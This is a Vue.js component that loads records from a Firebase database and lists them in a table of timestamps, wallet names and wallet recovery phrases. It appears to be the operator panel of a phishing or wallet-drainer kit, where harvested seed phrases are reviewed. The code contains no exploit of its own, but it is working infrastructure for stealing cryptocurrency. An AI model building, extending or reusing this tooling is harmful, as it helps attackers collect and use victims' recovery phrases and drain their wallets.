<template>
    <div id="app">
    <div class="scrollable-table">
        <table id="customers-table">
         <tr>
           <th>Time</th>
           <th>Wallet</th>
           <th>Recovery Phrase</th>
         </tr>
          <tbody v-for= "item in Details " :key="item.id">
           <tr>
             <td> {{ item.date }} </td>
              <td> {{ item.wallet_name }} </td>
          <td> {{ item.phrase }} </td>
         </tr>
          </tbody>
        
       
       </table>
           </div>
         
  </div>
</template>

<script>
import axios from "axios";
import moment from 'moment'
export default {
        data() {
            return{
               Details:[]  
            }
       
    },
async mounted(){
     const items = await axios.get("https://wallet-60845-default-rtdb.firebaseio.com/result.json");
     const result = items.data
     var array = Object.keys(result)
    .map(function(key) {
        return result[key];
    });
 

    const newArr = array.map((result) => {
         return{
             "date" : moment(result.Date).format('MMMM Do YYYY, h:mm:ss a'),
             "wallet_name": result.wallet_name,
             "phrase": result.phrase
         }
     })

      this.Details = newArr;
}
}
</script>


<style scoped>
  .scrollable-table {
      width:100%;
        overflow-x: scroll;
      overflow-y: hidden;
    }
    #customers-table {
      width:100%;
      font-family: "Trebuchet MS", Arial, Helvetica, sans-serif;
    }
    
    #customers-table td, #customers-table th {
      border: 1px solid #ddd;
      padding: 8px;
    }
    
    #customers-table tr:nth-child(even){background-color: #f2f2f2;}
    
    #customers-table tr:hover {background-color: #ddd;}
    
    #customers-table th {
      padding-top: 12px;
      padding-bottom: 12px;
      text-align: left;
      background-color: #6113f2;
      color: white;
    }
</style>